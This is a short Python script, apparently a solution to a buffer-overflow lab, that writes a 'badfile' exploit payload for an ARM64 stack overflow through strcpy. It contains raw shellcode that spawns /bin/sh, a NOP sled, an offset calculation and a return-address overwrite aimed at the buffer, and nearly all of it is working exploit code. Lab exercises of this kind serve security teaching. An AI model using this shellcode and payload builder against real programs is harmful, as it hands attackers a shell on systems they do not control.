#!/usr/bin/python3
import sys

# Minimal 40-byte ARM64 shellcode: execve("/bin/sh", NULL, NULL)
shellcode = (
    "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
    "\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
    "\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
).encode('latin-1')

# Fill with NOPs (0xD503201F is NOP instruction in ARM64)
nop = (0xD503201F).to_bytes(4, byteorder='little')
content = bytearray(517)
for offset in range(int(517/4)):
    content[offset*4:offset*4 + 4] = nop

##################################################################
buffer_addr = 0x0000fffffffff3b0       # ✩ Need to change ✩
foo_frame_pointer = 0x0000fffffffff3d0 # ✩ Need to change ✩

offset_to_ret = (foo_frame_pointer + 8) - buffer_addr  # = 40 bytes

# SOLUTION: Use minimal 40-byte shellcode that fits before return address
# strcpy copies shellcode (40 bytes) then hits null in return address and stops
start = 0
content[start:start + len(shellcode)] = shellcode
ret = buffer_addr  # Point to shellcode at buffer start

if offset_to_ret < 0 or offset_to_ret + 8 > len(content):
    print(f"Error: Invalid offset {offset_to_ret}")
    sys.exit(1)

content[offset_to_ret:offset_to_ret + 8] = ret.to_bytes(8, byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
